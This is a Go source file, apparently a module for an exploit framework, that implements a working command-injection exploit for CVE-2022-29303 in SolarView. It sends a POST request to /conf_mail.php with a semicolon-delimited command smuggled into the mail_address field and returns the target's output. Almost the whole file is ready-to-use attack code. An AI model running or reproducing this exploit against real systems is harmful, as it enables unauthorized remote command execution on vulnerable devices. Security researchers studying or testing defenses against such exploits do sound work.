package exp_Solarview

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2022_29303 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_29303) Attack_cmd1() (expResult exp_model.ExpResult) {
	//获取header
	headers := self.GetInitExpHeaders()
	//设置格式
	headers.Set("Content-Type", "application/x-www-form-urlencoded")
	//设置poc
	payload := `mail_address=%3Bid%3B&button=%83%81%81%5B%83%8B%91%97%90M`
	//替换poc
	payload = strings.Replace(payload, "id", self.MustGetStringParam("cmd"), 1)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/conf_mail.php"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		self.EchoSuccessMsg("执行失败，请检查命令执行结果！")
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		expResult.Result = httpresp.Body

	}
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2022_29303{}, "exp_CVE_2022_29303.yml")
}
